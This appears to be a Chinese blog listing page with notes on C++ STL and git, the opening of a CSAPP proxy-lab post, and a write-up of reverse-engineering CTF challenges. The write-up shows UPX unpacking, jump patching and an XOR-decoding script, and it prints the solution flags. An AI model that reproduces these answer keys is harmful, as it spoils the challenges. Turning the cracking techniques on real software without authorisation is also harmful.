class="comment">//创建迭代器（指针）</span></span><br></pre></td></tr></table></figure></li>
<li><p>String：字符串</p>
</li>
<li><p>List：双向链表</p>
<p>不能操控下标，只能添加和删除以及遍历；</p>
<p>用法和维克托差不多，多了个对头的操作：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Push_front		<span class="comment">//插入头部</span></span><br><span class="line">Pop_front		<span class="comment">//头部删除</span></span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">list&lt;type&gt; item;	<span class="comment">//创建</span></span><br><span class="line">list::iterator it = item.<span class="built_in">begin</span>();		<span class="comment">//创建迭代器（指针）</span></span><br></pre></td></tr></table></figure>

<p>若要操作插入，需要创建迭代器，并且用for循环让iterator++,对list而言，迭代器不能直接加一个数；</p>
</li>
<li><p>Deque：双端队列</p>
</li>
</ul>
<p>关联容器：</p>
<ul>
<li><p>Set</p>
</li>
<li><p>Map</p>
<p>类似于python字典，有 key 和 value，其类型位pair；</p>
<p>可以用 <code>map[key] = value</code> 实现赋值；</p>
<p>用法：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">map&lt;<span class="keyword">const</span> <span class="keyword">char</span>*, <span class="keyword">int</span>&gt; item;</span><br><span class="line">item.<span class="built_in">insert</span>(<span class="built_in">make_pair</span>(<span class="string">&quot;BC&quot;</span>,<span class="number">12</span>));</span><br><span class="line">map::iterator it = item.<span class="built_in">begin</span>();</span><br><span class="line">it -&gt; first <span class="comment">//访问key值</span></span><br><span class="line">it -&gt; second<span class="comment">//访问value值</span></span><br></pre></td></tr></table></figure></li>
<li><p>Multiset</p>
</li>
<li><p>Multimap</p>
</li>
</ul>
<p>容器适配器：</p>
<ul>
<li>Stack</li>
<li>Queue</li>
<li>Prority queue</li>
</ul>
<h2 id="接口的概念"><a href="#接口的概念" class="headerlink" title="接口的概念"></a>接口的概念</h2><p>在<strong>面向对象</strong>的过程中，接口就是公共属性的函数，是类内部私有属性和用户的桥梁；</p>
<p>在<strong>多态</strong>的解释中，接口是抽象类函数，运用这个接口去实现不同子类的多态；</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>实际学下来花了接近2个星期吧，说多不多说少不少，要真的掌握和吃牢固还是比较难受；</p>
<p>这么多内容实际上和C的差别也就是编译器，底层展现的代码其实都差不多（比如引用），按java的说法，其实对于这类语言还有更多说法，比如类里定义另类型对象这种<strong>聚集</strong>关系，以及链式异常（两种不同嵌套）；</p>
<h3 id="关于多态的思考"><a href="#关于多态的思考" class="headerlink" title="关于多态的思考"></a>关于多态的思考</h3><p>类型变量实际上也是一个引用，只不过CPP是声明即创建，只不过没赋值，而java是需要声明和创建的；所以导致一个结果：java只需要声明后创建子类类型就能实现多态，而CPP需要创建一个类指针来接收子类引用；</p>
<h3 id="关于类的思考"><a href="#关于类的思考" class="headerlink" title="关于类的思考"></a>关于类的思考</h3><p>STL的思想就很像java，感觉STL在往java和python靠，把一些容器的实现都弄成类，而且是泛型的；但是用之前记得调用头文件和std命名空间；</p>
</div></div><a class="button-hover more" href="/SecondBC/2022/10/28/C++%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/SecondBC/2022/10/11/git%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/">git学习日记</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2022-10-16</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/Diary/">Diary</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/Git/">Git</a></div></div><div class="post-content"><div class="main-content content"><p>git是分布式版本控制系统；</p>
<h2 id="什么是版本控制系统？"><a href="#什么是版本控制系统？" class="headerlink" title="什么是版本控制系统？"></a>什么是版本控制系统？</h2><p>比如写游戏，会分版本，从一代的基础上复制并修改为二代，一代保留（类似MC的1.7.10和1.19）；</p>
<p>当出了很多个版本之后，<strong>一点</strong>是想要回去玩之前的经典版本，但在版本丛中不好找；第<strong>二点</strong>是两个部门合作一个版本时分工不同，需要对一个共享文件进行改动，但是不知道另一个部门在什么时候做了什么改动，要合并内容，会比较难顶；</p>
<p>而一个软件能解决这些毛病，<strong>记录每次文件的改动，且允许共同编辑</strong>，称其为版本控制系统，目的为了方便开发大项目；</p>
<h2 id="分布式与集中式？"><a href="#分布式与集中式？" class="headerlink" title="分布式与集中式？"></a>分布式与集中式？</h2><p>集中式：版本库集中于中央服务器，每次改动会从其中获取新版本，之后推送回去；</p>
<p>分布式：每个人的文件中都有版本库，所以工作时不需联网，合作时，只需要将改动推送给对方，多人合作时，会有一人充当中央服务器；</p>
<h2 id="Git工作流程"><a href="#Git工作流程" class="headerlink" title="Git工作流程"></a>Git工作流程</h2><p><img src="https://s2.loli.net/2022/10/11/9zTqdhYIPXAW7Ux.png" alt="do"></p>
<p>Workspace：<strong>工作区</strong>，平时存放项目代码的地方。<br>Index / Stage：<strong>暂存区</strong>，用于临时存放你的改动，事实上它只是一个文件，保存即将提交到文件列表信息。<br>Repository：<strong>仓库区</strong>（或本地仓库），就是安全存放数据的位置，这里面有你提交到所有版本的数据。其中HEAD指向最新放入仓库的版本。<br>Remote：<strong>远程仓库</strong>（github） ，托管代码的服务器，可以简单的认为是你项目组中的一台电脑用于远程数据交换。</p>
<p>一个文件夹即可成为工作区，其中初始化后有一个.git后缀子目录，存放Git管理信息；.git里又有暂存区和仓库区；</p>
<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p>使文件夹成为工作区：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init (指定目录)</span><br></pre></td></tr></table></figure>



<p>添加文件到暂缓区：(name可以是*.加上后缀名，表示全部的一类后缀名都加入)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add (name)</span><br></pre></td></tr></table></figure>



<p>告知后提交，真正加入仓库中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m &quot;初始化项目版本&quot;</span><br></pre></td></tr></table></figure>



<p>查看仓库当前状态，显示有变更的文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure>



<p>回退版本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset (place)</span><br></pre></td></tr></table></figure>



<p>从暂缓区和工作区中删除：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rm</span><br></pre></td></tr></table></figure>



<p>移动或重命名工作区文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git mv</span><br></pre></td></tr></table></figure>



<h3 id="远程操作"><a href="#远程操作" class="headerlink" title="远程操作"></a>远程操作</h3><p>控制远程仓库：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote (基本操作)</span><br></pre></td></tr></table></figure>



<p>从远程获取代码库：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git fetch</span><br></pre></td></tr></table></figure>



<p>下载远程代码并合并：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull</span><br></pre></td></tr></table></figure>



<p>上传远程代码并合并：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push</span><br></pre></td></tr></table></figure>



<p>撤回：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git revert</span><br></pre></td></tr></table></figure>

<p>实际上是将之前的提交记录的相同状态再提交了一遍；</p>
<h3 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h3><p>创建分支：(不加name则是列出分支)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch (name)</span><br></pre></td></tr></table></figure>

<p>带参：-d，表示delete，删除该分支；</p>
<p>​           -f，强制移动；例如：git branch -f main HEAD~3 将main分支移动到HEAD所指的提交记录上；</p>
<p>切换分支：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout (name)</span><br></pre></td></tr></table></figure>

<p>带参：-b，意思是先branch，再checkout，可以直接切换到新创的分支里；</p>
<p>name是某个具体提交记录那么就会分离HEAD，name如果是分支名加^，就会移到前一个提交记录；</p>
<p>如果是HEAD加~x，就会移动到前x个提交记录；</p>
<p>合并分支：（当前分支上融合另一个，另一个会存在一个副本）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge</span><br></pre></td></tr></table></figure>



<p>合并同一分支上且不留副本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rebase </span><br></pre></td></tr></table></figure>

<p>带参：-i，交互式rebase；</p>
<p>将其他提交记录直接放到当前分支下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git cherry-pick (name1) (name2)</span><br></pre></td></tr></table></figure>



<h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>更多练习：<a href="">learngitbranching.js.org</a></p>
<p>github添加一个远程库命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin git@github.com:XXXXX</span><br><span class="line">git branch -M main</span><br><span class="line">git push -u origin main</span><br></pre></td></tr></table></figure>

</div></div><a class="button-hover more" href="/SecondBC/2022/10/11/git%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/SecondBC/2022/10/04/0x41414141/">0x41414141 CTF</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2022-10-16</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/WriteUp/">WriteUp</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/Reverse/">Reverse</a></div></div><div class="post-content"><div class="main-content content"><h2 id="Backupkeys"><a href="#Backupkeys" class="headerlink" title="Backupkeys"></a>Backupkeys</h2><p>Can you recover my backup keys to get the flag , they probably are hardcoded ?</p>
<p>提示说明 flag 是硬编码；</p>
<p>进入IDA只有start和零散的几个函数，说明加壳了；</p>
<p>用16进制查看器搜UPX可以发现 UPX! 标志；</p>
<p>脱壳后看main函数：</p>
<p><img src="https://s2.loli.net/2022/10/03/CSgXzEMV4Z1LjYD.png" alt="main"></p>
<p>在最下方的输出 try harder的另一条线上有一个输出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;Phew Phew collect the keys below , don&#x27;t forget to put them in flag&#123;&#125; format&quot;</span></span><br></pre></td></tr></table></figure>

<p>消除逗号得到硬编码的flag：<strong>flag{Hardcodedpasswordsareuseless}</strong></p>
<h2 id="X-and-or"><a href="#X-and-or" class="headerlink" title="X-and-or"></a>X-and-or</h2><p>查看main：</p>
<p><img src="https://s2.loli.net/2022/10/03/9Ty1V4DXIGBQqm3.png" alt="main"></p>
<p>code是一个运行后设置的地址，跳转到主要函数；从code里的判断可得知，输入长度为38；进入运算后循环38次，内部有固定数字进行异或运算并与输入内容比较；</p>
<p><img src="https://s2.loli.net/2022/10/03/nhFodMJmyUXiKzI.png" alt="code"></p>
<p>循环的结尾是比较数据，需要使得eax最终为0；经过调试可以发现每次异或0~5的立方，满6归0；</p>
<p>写出脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">origin = [<span class="number">0x66</span>, <span class="number">0x6D</span>, <span class="number">0x69</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x48</span>, <span class="number">0x36</span>, <span class="number">0x31</span>, <span class="number">0x3E</span>, <span class="number">0x28</span>, <span class="number">0x77</span>, <span class="number">0x19</span>, <span class="number">0x63</span>, <span class="number">0x31</span>, <span class="number">0x6C</span>, <span class="number">0x78</span>, <span class="number">0x24</span>, <span class="number">0x4E</span>, <span class="number">0x33</span>, <span class="number">0x63</span>, <span class="number">0x3D</span>, <span class="number">0x7D</span>, <span class="number">0x26</span>, <span class="number">0x4E</span>, <span class="number">0x37</span>, <span class="number">0x39</span>, <span class="number">0x30</span>, <span class="number">0x2B</span>, <span class="number">0x23</span>, <span class="number">0x1C</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x6A</span>, <span class="number">0x29</span>, <span class="number">0x74</span>, <span class="number">0x1B</span>, <span class="number">0x62</span>, <span class="number">0x7C</span>]</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">38</span></span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">    flag[i] = <span class="built_in">chr</span>(((k*k*k)) ^ origin[i])</span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">6</span>:</span><br><span class="line">        k = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br></pre></td></tr></table></figure>

<p>由此得到flag：<strong>flag{560637dc0dcd33b5ff37880ca10b24fb}</strong></p>
<p>这题最有意思的是init函数，他把code的二进制内容异或上了0x42，需要将其变回来则再异或0x42，然后写在新的txt里，用IDA反编译，设置sp值，然后就能看到伪代码了：</p>
<p><img src="https://s2.loli.net/2022/10/03/aeJj91hNIT2ozlP.png" alt="code"></p>
<h2 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h2><p>I received a corrupted program the keys are probably lost within the game can you just find it for me to get the flag?.</p>
<p>Flag format : flag{key1+key2}</p>
<p>一开始看main觉得很奇怪，明明汇编有其他分支为什么伪代码始终显示的是 oops wrong path ？</p>
<p>结果发现是因为跳转的地方动了手脚：</p>
<p><img src="https://s2.loli.net/2022/10/03/GpBMo9VZQwleg6J.png" alt="jmp"></p>
<p>它始终都是判断必走另一条路，所以找不到正确的上下文；本来以为很难的题一下就变成了渣渣题；</p>
<p>里里外外都改一下jmp，再运行一遍，它就自己吐flag了；</p>
<p>得出：<strong>flag{456789JKLq59U1337}</strong></p>
<h2 id="Cage"><a href="#Cage" class="headerlink" title="Cage"></a>Cage</h2><p>Are you aware of the scopes yet?</p>
<p>开场patch main_one函数得到正确的上下文；</p>
<p><img src="https://s2.loli.net/2022/10/04/SprgcPE8LWuNDdn.png" alt="main"></p>
<p>发现需要输入一系列magic code，然后它会吐出已有的字符串，直接将字符串拼起来得到flag：</p>
<p><strong>flag{0xm4tr1xreal}</strong></p>
<h2 id="Ware"><a href="#Ware" class="headerlink" title="Ware"></a>Ware</h2><p>My plaintext has been encrypted by an innocent friend of mine while playing around cryptographic libraries, can you help me to recover the plaintext , remembers it’s just numbers and there’s a space between some numbers which you need to remove the space and submit the recovered plain text as a flag.</p>
<p>开始一个upx直接脱掉；</p>
<p>搜索运行时的字符串得到flag：<strong>flag{32117406899806798980909}</strong></p>
<h2 id="WrongDownload"><a href="#WrongDownload" class="headerlink" title="WrongDownload"></a>WrongDownload</h2><p>My key has been missing inside these two binaries can you help me to find it out ,as per my friend the key is divided in two parts between the two binaries so, remember you need to join them up before submitting as a flag.</p>
<p>直接反编译就能找到：<strong>flag{S6c56bnXQiBjk9mqSYE7ykVQ7NzrRy}</strong></p>
</div></div><a class="button-hover more" href="/SecondBC/2022/10/04/0x41414141/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/SecondBC/2022/10/01/Proxy-lab/">Proxy_lab</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2022-10-16</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/Lab/">Lab</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/CSAPP/">CSAPP</a></div></div><div class="post-content"><div class="main-content content"><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>一个web代理，并有多线程和缓存功能，所以一一来实现；</p>
<ul>
<li>根据 write up 中所说，首先需要实现 HTTP/1.0 GET 请求的顺序代理：读取整个请求并解析请求（<strong>是否是有效HTTP请求</strong>），如果是则建立自己到适当 web服务器的连接，请求客户端指定对象，再将响应转发回客户端；注意：HTTP请求每行以\r\n结束，并以\r\n为尾行；<ul>
<li>具体要做到将url解析为三部分：host，后半url，HTTP版本；</li>
<li>请求头中包含ua，host，connection，proxy-connection；</li>
<li>请求端口无论在url中还是默认的都必须正确；</li>
<li>处理过早关闭的连接，需要捕获SIGPIPE；</li>
</ul>
</li>
<li>实现多线程工作（生产者-消费者）；</li>
<li>实现缓存最近内存中使用的web对象（LRU策略）；<ul>
<li>设置缓存的最大内存，以及单个对象的最大内存；</li>
</ul>
</li>
</ul>
<p>handout给出了tiny服务器的源码，只需要在这个基础上进行改装；</p>
<h2 id="Tiny解析"><a href="#Tiny解析" class="headerlink" title="Tiny解析"></a>Tiny解析</h2><p>main函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> listenfd, connfd;</span><br><span class="line">    <span class="keyword">char</span> hostname[MAXLINE], port[MAXLINE];</span><br><span class="line">    <span class="keyword">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//输入端口参数</span></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;usage: %s &lt;port&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//监听描述符</span></span><br><span class="line">    listenfd = Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">	clientlen = <span class="keyword">sizeof</span>(clientaddr);</span><br><span class="line">    <span class="comment">//接受请求成为描述符</span></span><br><span class="line">	connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen); </span><br><span class="line">        <span class="comment">//读取套接字信息，IP和端口</span></span><br><span class="line">        Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, </span><br><span class="line">                    port, MAXLINE, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Accepted connection from (%s, %s)\n&quot;</span>, hostname, port);</span><br><span class="line">    <span class="comment">//响应</span></span><br><span class="line">	doit(connfd); </span><br><span class="line">    <span class="comment">//关闭接受描述符</span></span><br><span class="line">	Close(connfd);                                            </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>doit函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">doit</span><span class="params">(<span class="keyword">int</span> fd)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> is_static;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">sbuf</span>;</span></span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> filename[MAXLINE], cgiargs[MAXLINE];</span><br><span class="line">    <span class="keyword">rio_t</span> rio;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//读取请求行</span></span><br><span class="line">    Rio_readinitb(&amp;rio, fd);</span><br><span class="line">    <span class="keyword">if</span> (!Rio_readlineb(&amp;rio, buf, MAXLINE))  </span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%s %s %s&quot;</span>, method, uri, version);       <span class="comment">//解析请求行</span></span><br><span class="line">    <span class="keyword">if</span> (strcasecmp(method, <span class="string">&quot;GET&quot;</span>)) &#123;                     <span class="comment">//是否为GET请求</span></span><br><span class="line">        clienterror(fd, method, <span class="string">&quot;501&quot;</span>, <span class="string">&quot;Not Implemented&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Tiny does not implement this method&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;                                                    </span><br><span class="line">    read_requesthdrs(&amp;rio);    <span class="comment">//显示请求行和头（printf）                          </span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    is_static = parse_uri(uri, filename, cgiargs);      <span class="comment">//解析uri</span></span><br><span class="line">    <span class="keyword">if</span> (stat(filename, &amp;sbuf) &lt; <span class="number">0</span>) &#123;                    </span><br><span class="line">	clienterror(fd, filename, <span class="string">&quot;404&quot;</span>, <span class="string">&quot;Not found&quot;</span>,</span><br><span class="line">		    <span class="string">&quot;Tiny couldn&#x27;t find this file&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">    &#125;                                                    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_static) &#123;       </span><br><span class="line">	<span class="keyword">if</span> (!(S_ISREG(sbuf.st_mode)) || !(S_IRUSR &amp; sbuf.st_mode)) &#123; </span><br><span class="line">	    clienterror(fd, filename, <span class="string">&quot;403&quot;</span>, <span class="string">&quot;Forbidden&quot;</span>,</span><br><span class="line">			<span class="string">&quot;Tiny couldn&#x27;t read the file&quot;</span>);</span><br><span class="line">	    <span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	serve_static(fd, filename, sbuf.st_size);        <span class="comment">//静态</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">	<span class="keyword">if</span> (!(S_ISREG(sbuf.st_mode)) || !(S_IXUSR &amp; sbuf.st_mode)) &#123; </span><br><span class="line">	    clienterror(fd, filename, <span class="string">&quot;403&quot;</span>, <span class="string">&quot;Forbidden&quot;</span>,</span><br><span class="line">			<span class="string">&quot;Tiny couldn&#x27;t run the CGI program&quot;</span>);</span><br><span class="line">	    <span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	serve_dynamic(fd, filename, cgiargs);            <span class="comment">//动态</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>serve_static函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">serve_static</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *filename, <span class="keyword">int</span> filesize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> srcfd;</span><br><span class="line">    <span class="keyword">char</span> *srcp, filetype[MAXLINE], buf[MAXBUF];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//发送响应行和报头</span></span><br><span class="line">    get_filetype(filename, filetype);    </span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;HTTP/1.0 200 OK\r\n&quot;</span>); </span><br><span class="line">    Rio_writen(fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;Server: Tiny Web Server\r\n&quot;</span>);</span><br><span class="line">    Rio_writen(fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;Content-length: %d\r\n&quot;</span>, filesize);</span><br><span class="line">    Rio_writen(fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;Content-type: %s\r\n\r\n&quot;</span>, filetype);</span><br><span class="line">    Rio_writen(fd, buf, <span class="built_in">strlen</span>(buf));    </span><br><span class="line"></span><br><span class="line">    <span class="comment">//回响载体</span></span><br><span class="line">    srcfd = Open(filename, O_RDONLY, <span class="number">0</span>); </span><br><span class="line">    srcp = Mmap(<span class="number">0</span>, filesize, PROT_READ, MAP_PRIVATE, srcfd, <span class="number">0</span>); <span class="comment">//映射内存保证原文件纯净</span></span><br><span class="line">    Close(srcfd);                       </span><br><span class="line">    Rio_writen(fd, srcp, filesize);     </span><br><span class="line">    Munmap(srcp, filesize);             </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>serve_dynamic函数：</p>
